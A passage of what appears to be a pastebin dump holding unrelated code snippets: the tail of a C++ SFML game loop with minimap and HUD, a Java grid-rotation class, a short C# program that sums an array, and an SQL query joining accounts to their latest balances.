        dyView.setViewport(sf::FloatRect(0.f,0.f,1.f,1.f));
        
        // MiniMap
        sf::View miniMap (sf::FloatRect(0.f,0.f,bg.getLocalBounds().width, bg.getGlobalBounds().height));
        miniMap.setViewport(sf::FloatRect(0.75F,0.f,0.25F,0.25F));
                
        // HUD - Text
        sf::Text oneUp;
        sf::Text score;
        sf::Text tDelta;
        sf::Text tElapsed;
        sf::Text tElapsed2;

        sf::Font font(AssetManager::GetFont(Utils::GetWorkingDirectory() + ""Media/Fonts/KOMIKAP_.ttf""));
        
        oneUp.setFont(font);                   score.setFont(font);
        oneUp.setString(""1 UP"");               score.setString(""12345"");
        oneUp.setCharacterSize(30U);           score.setCharacterSize(20U);
        oneUp.setFillColor(sf::Color::White);  score.setFillColor(sf::Color::White);

        oneUp.setPosition(sf::Vector2f(50,10));
        score.setPosition(sf::Vector2f(50,50));    

        tDelta.setFont(font);                   tElapsed.setFont(font);
        tDelta.setCharacterSize(10U);           tElapsed.setCharacterSize(10U);
        tDelta.setFillColor(sf::Color::Red);    tElapsed.setFillColor(sf::Color::Red);

        tElapsed2.setFont(font);
        tElapsed2.setCharacterSize(10U);
        tElapsed2.setFillColor(sf::Color::Red);

        tDelta.setPosition(sf::Vector2f(50.f, 300.f));
        tElapsed.setPosition(sf::Vector2f(50.f,325.f));
        tElapsed2.setPosition(sf::Vector2f(50.f,350.f));


        
        // Rect Shape replacement Minimap
        sf::RectangleShape rectPl(sf::Vector2f(15.f,30.f));
        rectPl.setFillColor(sf::Color::Red);
        rectPl.setOrigin(rectPl.getSize()*0.5F);
        
        
        // Life bar
        sf::RectangleShape lifeBar(sf::Vector2f(96.f, 10.f));
        lifeBar.setFillColor(sf::Color::Green);
        lifeBar.setOrigin(lifeBar.getSize()*0.5F);


        // Animations
        sf::Sprite player;
        sf::Vector2i playerSize(32,32);
        
        Animator animPlayer(player);
        auto& idleRAnim = animPlayer.CreateAnimation(""IdleR"", Utils::GetWorkingDirectory() + ""Media/S_Sheets/PlayerSheet.png"", sf::seconds(0.8f), true); 
        idleRAnim.AddFrames(sf::Vector2i(0,0), playerSize, 8U);
        
        auto& idleLAnim = animPlayer.CreateAnimation(""IdleL"", Utils::GetWorkingDirectory() + ""Media/S_Sheets/PlayerSheet.png"", sf::seconds(0.8f), true); 
        idleLAnim.AddFrames(sf::Vector2i(0,32), playerSize, 8U);

        auto& rightAnim = animPlayer.CreateAnimation(""Right"", Utils::GetWorkingDirectory() + ""Media/S_Sheets/PlayerSheet.png"", sf::seconds(0.5f), true);
        rightAnim.AddFrames(sf::Vector2i(0,64), playerSize,6U);

        auto& leftAnim = animPlayer.CreateAnimation(""Left"", Utils::GetWorkingDirectory() + ""Media/S_Sheets/PlayerSheet.png"", sf::seconds(0.5f), true);
        leftAnim.AddFrames(sf::Vector2i(0,96), playerSize,6U);

        // Default Position and Origin
        player.setOrigin(sf::Vector2f(playerSize)*0.5F);
        player.setPosition(sf::Vector2f(32.f, window.getSize().y/2.f));

        // Move Control and Animation State
        enum class States {IdleR, IdleL, Right, Left};
        States currentState = States::IdleR;
        States beforeState = States::Right;

        // Time Control
        sf::Clock clock;
        float frameTime = 1.f/60.f; // frame rate, frame or tick
        sf::Time elapsed;   // cumulative
        sf::Time deltaTime; // delta time o time step 
        // collect pixel scene map
        sf::Vector2i pixel;
        //
        const float PlayerSpeed = 100.f;

        // Game Loop
        while (window.isOpen())
        {
            // Amount of time previous frame
            sf::Time deltaTime = clock.restart();
            
            // Accumulate time with each frame
            elapsed += deltaTime; //
            
            tDelta.setString(""delta: "" + std::to_string(deltaTime.asSeconds()) + "".s \n"");
            // H a n d l e   I n p u t
            // Handle Events
            sf::Event event;
            while (window.pollEvent(event))
            {
                switch (event.type)
                {
                    case sf::Event::EventType::Closed:
                        window.close();
                        break;
                        
                    case sf::Event::EventType::KeyReleased:
                        if (event.key.code == sf::Keyboard::Escape)
                            window.close();
                        break;
                    default:
                        break;
                    }
            }
            // I n p u t   R e a l  T i m e
            if (sf::Keyboard::isKeyPressed(sf::Keyboard::Key::P)) 
                currentState=States::Right;
            else if (sf::Keyboard::isKeyPressed(sf::Keyboard::Key::O)) 
                currentState=States::Left;
            else
            {
                switch (beforeState)
                {
                case States::Left:
                case States:: IdleL:
                    currentState=States::IdleL;
                    break;

                case States::Right:
                case States::IdleR:
                    currentState=States::IdleR;
                    break;
                default:
                    break;
                }
            }
            
            // U p d a t e   S c e n e
            if (elapsed.asSeconds() >= frameTime) 
            {
                // Do Something 60 times a second
                tElapsed.setString(""tElapsed: "" + std::to_string(elapsed.asSeconds()) + "".s \n"");
                sf::Vector2f movement(0.f, 0.f);

                switch (currentState)
                {
                case States::Right:
                    movement.x +=PlayerSpeed;
                    break;
                
                case States::Left:
                    movement.x -= PlayerSpeed;
                    break;
                case States::IdleR:
                case States::IdleL:
                    break;
                default:
                    throw std::runtime_error (""Wrong Selection __FILE__"");
                    break;
                }
                
                float fElapsed = elapsed.asSeconds();
                player.move(movement*fElapsed);

                rectPl.setPosition(player.getPosition());

                elapsed -= sf::seconds(frameTime);

                tElapsed2.setString(""tElapsed2: "" + std::to_string(elapsed.asSeconds()) + ""\n"");
            }

            // Animation Logic
            if (currentState != beforeState)
            {
                switch (currentState)
                {
                case States::Right:
                    animPlayer.SwitchAnimation(""Right"");
                    break;
                case States::Left:
                    animPlayer.SwitchAnimation(""Left"");
                    break;
                case States::IdleR:
                    animPlayer.SwitchAnimation(""IdleR"");
                    break;
                case States::IdleL:
                    animPlayer.SwitchAnimation(""IdleL"");
                    break;    
                default:
                    throw std::runtime_error (""Wrong Selection __FILE__"");
                    break;
                }
            }
            // run current animation
            animPlayer.Update(deltaTime);
            // collect before state
            beforeState=currentState;

            // R e n d e r   C y c l e
            window.clear(sf::Color::Black);
            // Game Camera
            if (player.getPosition().x < 320)
            {
                window.setView(window.getDefaultView());
            }
            else
            {
                dyView.setCenter(player.getPosition());
                window.setView(dyView);
            }          
            window.draw(bg);
            window.draw(player);
            // Collect pos pixel scene for life var y UI Position
            pixel=window.mapCoordsToPixel(player.getPosition());
            

            // miniMap Camera: Necesitamos dibujar
            window.setView(miniMap);
            window.draw(bg);
            window.draw(rectPl);

            // UI Camera
            window.setView(uiView);
            window.draw(oneUp);
            window.draw(score);
            window.draw(tDelta);
            window.draw(tElapsed);
            window.draw(tElapsed2);
            // set position life bar pixel to float coordinates + offset
            lifeBar.setPosition(window.mapPixelToCoords(pixel)+sf::Vector2f(0,-20));
            window.draw(lifeBar);

            window.display();
        }
        
        return 0;
    }
    catch(const std::exception& e)
    {
        std::cerr << e.what() << '\n';
        return 1;
    }
    
    catch(...) 
    {
        std::cerr << ""Oops: unknown exception!\n"";
        return 2;    // 2 indicates failure
    }
}
"
Z71CWXEi,Untitled,Hackder,Java,Sunday 10th of March 2024 01:39:13 PM CDT,"import java.util.ArrayList;
import java.util.OptionalInt;

enum SMER {
  DOLAVA,
  DOPRAVA
}

enum Rotation {
  VERTICAL,
  HORIZONTAL;

  public Rotation opposite() {
    return this == VERTICAL ? HORIZONTAL : VERTICAL;
  }
}

public record Rotuj90(SMER smer) implements Transformacia {
  @Override
  public String[] aplikuj(String[] arg) {
    var currentRotation = guessRotation(arg);

    var grid = createGrid(arg);

    var result = createEmptyGrid(grid[0].length, grid.length);

    if (smer == SMER.DOLAVA) {
      for (int i = 0; i < result.length; i++) {
        for (int j = 0; j < result[i].length; j++) {
          result[i][j] = grid[j][grid[i].length - i - 1];
        }
      }
    } else {
      for (int i = 0; i < result.length; i++) {
        for (int j = 0; j < result[i].length; j++) {
          result[i][j] = grid[grid.length - j - 1][i];
        }
      }
    }

    var newRotation = currentRotation.opposite();

    // Stick columns to the top.
    // Nobody know why this is necessary, but it is in the spec...
    if (newRotation == Rotation.VERTICAL) {
      for (int col = 0; col < result[0].length; col++) {
        for (int row = 0; row < result.length; row++) {
          if (result[row][col] == ' ') continue;

          for (int i = 0; i < result.length; i++) {
            char c = ' ';
            if (row + i < result.length) {
              c = result[row + i][col];
            }

            result[i][col] = c;
          }
          break;
        }
      }
    }

    // System.out.println(""-----------------------"" + smer.toString());
    // for (var row : grid) {
    //   System.out.println(Arrays.toString(row));
    // }
    // System.out.println(""-----------------------"");
    //
    // for (var row : result) {
    //   System.out.println(Arrays.toString(row));
    // }
    //
    // System.out.println(""-----------------------"");

    return toStringFormatted(result, newRotation == Rotation.HORIZONTAL);
  }

  public Rotation guessRotation(String[] arg) {
    for (String s : arg) {
      if (s.contains("" "")) {
        return Rotation.VERTICAL;
      }
    }

    return Rotation.HORIZONTAL;
  }

  public char[][] createEmptyGrid(int rows, int cols) {
    char[][] result = new char[rows][cols];

    for (int i = 0; i < rows; i++) {
      for (int j = 0; j < cols; j++) {
        result[i][j] = ' ';
      }
    }

    return result;
  }

  public char[][] createGrid(String[] arg) {
    int maxLength = 0;

    for (String s : arg) {
      if (s.length() > maxLength) {
        maxLength = s.length();
      }
    }

    int size = Math.max(arg.length, maxLength);
    char[][] result = createEmptyGrid(size, size);

    for (int row = 0; row < arg.length; row++) {
      for (int col = 0; col < arg[row].length(); col++) {
        char c = arg[row].charAt(col);

        result[row][col] = c;
      }
    }

    return result;
  }

  /**
   * Converts the char array to a string removing trailing spaces in the prcoess First finds the
   * minimum spanning rectangle that contains all the non-space characters and then creates a String
   * array containing the rectangle with no trailing spaces on each row
   *
   * @param chars
   * @param removeSpaces If true, removes spaces in between characters. Trailing spaces are always
   *     removed
   * @return
   */
  public String[] toStringFormatted(char[][] chars, boolean removeSpaces) {
    OptionalInt maybeColStart = OptionalInt.empty();
    OptionalInt maybeColEnd = OptionalInt.empty();

    for (int row = 0; row < chars.length; row++) {
      for (int col = 0; col < chars[row].length; col++) {
        if (chars[row][col] != ' ') {
          maybeColStart = OptionalInt.of(Math.min(col, maybeColStart.orElse(col)));
          break;
        }
      }

      for (int col = chars[row].length - 1; col >= 0; col--) {
        if (chars[row][col] != ' ') {
          maybeColEnd = OptionalInt.of(Math.max(col, maybeColEnd.orElse(col)));
          break;
        }
      }
    }

    assert maybeColStart.isPresent();
    assert maybeColEnd.isPresent();
    int colStart = maybeColStart.getAsInt();
    int colEnd = maybeColEnd.getAsInt();

    ArrayList<String> result = new ArrayList<>();

    for (int row = 0; row < chars.length; row++) {
      StringBuilder sb = new StringBuilder();

      for (int col = colStart; col <= colEnd; col++) {
        char c = chars[row][col];

        if (c == ' ' && removeSpaces) {
          continue;
        }

        sb.append(c);
      }

      // Remove trailing spaces
      for (int i = sb.length() - 1; i >= 0; i--) {
        if (sb.charAt(i) != ' ') {
          sb.setLength(i + 1);
          break;
        }
      }

      if (sb.length() > 0) {
        result.add(sb.toString());
      }
    }

    // System.out.println(result);

    return result.toArray(String[]::new);
  }
}
"
8CGJNt2E,Untitled,Abdula_2314124,C#,Sunday 10th of March 2024 01:35:43 PM CDT,"using System;

namespace TheBestPlayer
{
    class Program
    {
        static void Main(string[] args)
        {
            //string[] names = { ""OLeg"", ""Matviy"", ""Glib"", ""Mihaylo"", ""Petrys""};
            //int[] scores = { 30, 1000, 50000, 60, 70 };

            //int maxScore = 0;
            //int maxIndex = 0;

            //for (int i = 0; i < scores.Length; i++)
            //{
            //    if (maxScore < scores[i])
            //    {
            //        maxIndex = i;
            //        maxScore = scores[i];
            //    }
            //}

            //Console.WriteLine(names[maxIndex] + "" "" + maxScore);




            int[] marks = { 1, 25, 6, 7, 4, 8 };
            int sumMarks = 0;

            for (int i = 0; i < marks.Length; i++)
            {
                sumMarks += marks[i];
            }

            Console.WriteLine(sumMarks);
        }
    }
}
"
4aEYzeKN,sql to orm,ruchej,SQL,Sunday 10th of March 2024 01:35:12 PM CDT,"SELECT 
  PA.ID, 
  PA.AREA, 
  PA.CITY, 
  PA.STREET, 
  PA.HOUSE, 
  PA.APARTAMENT, 
  PA.CODE_ACCOUNT, 
  --   OBF.ADRESS_FIAS,
  --   OBF.KADASTR_NUMBER,
  --   OBF.FIAS,
  PA.FIO, 
  PA.CONTRACT_NAME, 
  PA.HOUSE_TYPE, 
  PA.DATE_FROM, 
  PA.DATE_BY, 
  PA.DATE_CREATE, 
  PA.DATE_UPDATE, 
  PA.USER_ID, 
  PA.CONTRACT_ID, 
  PA.RKC, 
  B1.SALDO_K, 
  B1.KOL_MONTH, 
  B1.PAYMENT, 
  B1.RECALC, 
  B1.ACCRUAL,
  TO_CHAR(B1.BALANCE_DATE, 'yyyy-mm-dd') AS BALANCE_DATE 
FROM 
  PERSONAL_ACCOUNT PA 
  LEFT JOIN (
    SELECT 
      B.ACCOUNT_ID, 
      B.BALANCE_DATE, 
      B.SALDO_N, 
      B.ACCRUAL, 
      B.RECALC, 
      B.PAYMENT, 
      CASE WHEN B.ACCRUAL <> 0 THEN ROUND(B.SALDO_N / B.ACCRUAL, 0) ELSE 0 END KOL_MONTH, 
      B.SALDO_K 
    FROM 
      BALANCE B 
      JOIN (
        SELECT 
          ACCOUNT_ID, 
          MAX(BALANCE_DATE) AS MAX_BALANCE_DATE 
        FROM 
          BALANCE 
        GROUP BY 
          ACCOUNT_ID
      ) MAX_BALANCE_DATE ON B.ACCOUNT_ID = MAX_BALANCE_DATE.ACCOUNT_ID 
      AND B.BALANCE_DATE = MAX_BALANCE_DATE.MAX_BALANCE_DATE
  ) B1 ON PA.ID = B1.ACCOUNT_ID
limit 5"
